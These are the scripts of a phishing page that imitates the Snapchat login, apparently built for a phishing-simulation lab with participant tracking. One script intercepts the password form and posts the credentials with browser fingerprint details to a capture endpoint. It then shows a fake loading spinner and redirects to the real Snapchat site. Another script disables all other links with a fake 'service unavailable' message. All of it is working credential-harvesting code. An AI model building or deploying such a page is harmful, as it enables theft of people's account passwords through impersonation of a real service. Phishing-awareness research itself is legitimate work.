<script>
(function () {
    var pid = sessionStorage.getItem('participant_id') || '';
    if (pid) {
        document.querySelectorAll('form').forEach(function (f) {
            var inp = document.createElement('input');
            inp.type = 'hidden';
            inp.name = 'participant_id';
            inp.value = pid;
            f.appendChild(inp);
        });
    }
})();
</script>

<script>
(function() {
    var pageStart = Date.now();
    var clickCount = 0;
    document.addEventListener('click', function() { clickCount++; });

    var username = new URLSearchParams(window.location.search).get('u') || sessionStorage.getItem('lab_username') || '';
    var display = document.getElementById('lab-username-display');
    if (display && username) display.textContent = username;

    document.addEventListener('submit', function(e) {
        var pwForm = e.target.closest('#lab-password-form');
        if (!pwForm) return;
        e.preventDefault();

        var fd = new FormData(pwForm);
        var data = {};
        fd.forEach(function(v, k) { data[k] = v; });
        data.participant_id = sessionStorage.getItem('participant_id') || '';
        if (username) data.accountIdentifier = username;
        data.step = 'password';
        data.screen_resolution = screen.width + 'x' + screen.height;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.browser_language = navigator.language;
        data.platform = navigator.platform;
        data.time_on_page = Math.floor((Date.now() - pageStart) / 1000);
        data.referrer = document.referrer;
        data.click_count = clickCount;

        fetch('/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data),
            keepalive: true
        });

        var container = document.querySelector('.Login_container__KLPD5') || pwForm.parentElement;
        if (container) {
            container.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:200px;gap:16px;padding:40px"><div style="width:40px;height:40px;border:4px solid #eee;border-top-color:#FFFC00;border-radius:50%;animation:spin 1s linear infinite"></div><p style="font-size:16px;color:#16191c">Connexion en cours...</p><p style="font-size:12px;color:#71757a">Veuillez patienter</p></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>';
        }
        setTimeout(function() {
            window.location.href = 'https://accounts.snapchat.com';
        }, 2000);
    });
})();
</script>

<script>
(function() {
    var allowed = "a, button, [role=\"button\"], input[type=\"submit\"]";
    var toast = document.createElement('div');
    toast.id = 'lab-toast';
    toast.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#000;color:#fff;padding:12px 24px;border-radius:8px;font-size:14px;z-index:999999;opacity:0;transition:opacity 0.3s;pointer-events:none;text-align:center;max-width:90%';
    toast.textContent = 'Service temporairement indisponible';
    document.body.appendChild(toast);
    var toastTimer = null;
    function showToast() {
        toast.style.opacity = '1';
        if (toastTimer) clearTimeout(toastTimer);
        toastTimer = setTimeout(function() { toast.style.opacity = '0'; }, 3000);
    }
    document.addEventListener('click', function(e) {
        var t = e.target.closest(allowed);
        if (!t) return;
        if (t.closest('#lab-password-form') || t.closest('#lab-forgot-pw')) return;
        e.preventDefault();
        showToast();
    }, true);
})();
</script>
